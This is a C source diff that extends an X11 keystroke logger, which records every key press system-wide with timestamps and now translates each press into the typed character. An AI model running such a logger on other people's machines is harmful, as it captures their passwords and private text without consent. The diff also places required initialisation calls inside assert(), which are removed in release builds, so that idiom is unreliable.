@@ -2,13 +2,14 @@
 #include <stdio.h>
 #include <string.h>
 #include <time.h>
+#include <assert.h>
 #include <X11/Xlib.h>
 #include <X11/extensions/XInput.h>
 
 static int KEY_PRESS_TYPE;
 static int KEY_RELEASE_TYPE;
 
-static void process_event( XDeviceKeyEvent *event )
+static void process_event( XDeviceKeyEvent *event , KeySym tr_keysym , char *tr_string )
 {
     KeySym keysym;
     char time_buf[ 20 ] = { 0 };
@@ -22,7 +23,7 @@ static void process_event( XDeviceKeyEvent *event )
     strftime( time_buf , 20 , "%d/%m/%Y %H:%M:%S" , localtime( &now ) );
 
     /* dump keystroke info */
-    printf( "%s %c %c %c %c %c %c %c %c %i %s\n" ,
+    printf( "%s %c %c %c %c %c %c %c %c %i %s" ,
             time_buf ,
             event->type == KEY_PRESS_TYPE ? 'P' : 'R' ,
             event->state & ShiftMask ? 'S' : 's' ,
@@ -35,6 +36,13 @@ static void process_event( XDeviceKeyEvent *event )
             event->keycode ,
             XKeysymToString( keysym ) );
 
+    /* dump translate keystroke (if available) */
+    if ( event->type == KEY_PRESS_TYPE && *tr_string )
+    {
+        printf( " %s %s" , tr_string , XKeysymToString( tr_keysym ) );
+    }
+
+    printf( "\n" );
     fflush( stdout );
 }
 
@@ -60,6 +68,39 @@ static int get_keybord_id( Display *display , XID *xid )
     return 0;
 }
 
+static XIC get_input_context( Display *display )
+{
+    int i;
+    XIM xim;
+    XIMStyles *xim_styles;
+    XIMStyle xim_style;
+    XIC xic;
+
+    /* open input method */
+    assert( xim = XOpenIM( display , NULL , NULL , NULL ) );
+
+    /* fetch styles  */
+    assert( XGetIMValues( xim , XNQueryInputStyle , &xim_styles , NULL ) == NULL );
+    assert( xim_styles != NULL );
+
+    /* search wanted style */
+    for ( xim_style = 0 , i = 0 ; i < xim_styles->count_styles ; i++ )
+    {
+        if ( xim_styles->supported_styles[ i ] == ( XIMPreeditNothing | XIMStatusNothing ) )
+        {
+            xim_style = xim_styles->supported_styles[ i ];
+            break;
+        }
+    }
+    assert( xim_style != 0 );
+
+    /* create input context */
+    assert( xic = XCreateIC( xim , XNInputStyle , xim_style , NULL ) );
+
+    XFree( xim_styles );
+    return xic;
+}
+
 int main( int argc , char *argv[] )
 {
     Display *display;
@@ -68,6 +109,7 @@ int main( int argc , char *argv[] )
     XID keyboard_id;
     XDevice *device;
     XEventClass event_class[ 2 ];
+    XIC xic;
 
     /* open display */
     if ( display = XOpenDisplay( NULL ) , !display )
@@ -94,6 +136,9 @@ int main( int argc , char *argv[] )
         return EXIT_FAILURE;
     }
 
+    /* get input context */
+    xic = get_input_context( display );
+
     /* register events */
     DeviceKeyPress( device , KEY_PRESS_TYPE , event_class[ 0 ] );
     DeviceKeyRelease( device , KEY_RELEASE_TYPE , event_class[ 1 ] );
@@ -102,10 +147,39 @@ int main( int argc , char *argv[] )
     /* event loop */
     while ( 1 )
     {
+        char tr_string[ 11 ] = { 0 };
+        KeySym tr_keysym;
         XEvent event;
 
-        /* process the next event */
+        /* wait for the next event */
         XNextEvent( display , &event );
-        process_event( ( XDeviceKeyEvent * )&event );
+
+        /* translate keystroke (key press only) */
+        if ( event.type == KEY_PRESS_TYPE )
+        {
+            XDeviceKeyEvent *device_key_event;
+            XKeyEvent key_event;
+            Status status;
+
+            /* build associated key event */
+            device_key_event = ( XDeviceKeyEvent * )&event;
+            key_event.type = KeyPress;
+            key_event.serial = device_key_event->serial;
+            key_event.send_event= device_key_event->send_event;
+            key_event.display = device_key_event->display;
+            key_event.window = device_key_event->window;
+            key_event.root = device_key_event->root;
+            key_event.subwindow = device_key_event->subwindow;
+            key_event.time = device_key_event->time;
+            key_event.state = device_key_event->state;
+            key_event.keycode = device_key_event->keycode;
+            key_event.same_screen = device_key_event->same_screen;
+
+            /* translate the keystroke */
+            XmbLookupString( xic , &key_event , tr_string , 10 , &tr_keysym , &status );
+        }
+
+        /* process the event */
+        process_event( ( XDeviceKeyEvent * )&event , tr_keysym , tr_string );
     }
 }
